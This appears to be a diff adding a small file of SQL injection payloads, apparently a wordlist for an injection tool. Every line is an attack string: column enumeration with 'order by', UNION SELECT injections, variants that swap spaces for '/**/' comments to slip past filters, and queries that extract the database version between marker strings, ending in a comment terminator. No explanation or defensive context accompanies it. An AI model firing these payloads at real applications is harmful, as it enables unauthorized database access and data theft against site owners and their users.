@@ -1,0 +1,8 @@
+
+order by 50
+0 union all select 1,2,3
+0/**/union/**/all/**/select/**/1,2,3
+0/**/union/**/all/**/select/**/1,2,group_concat("-X.25.X-",VERSION(),"-X.26.X-")
+
+
+-1 union all select 1,2,concat(version()) limit 1-- -
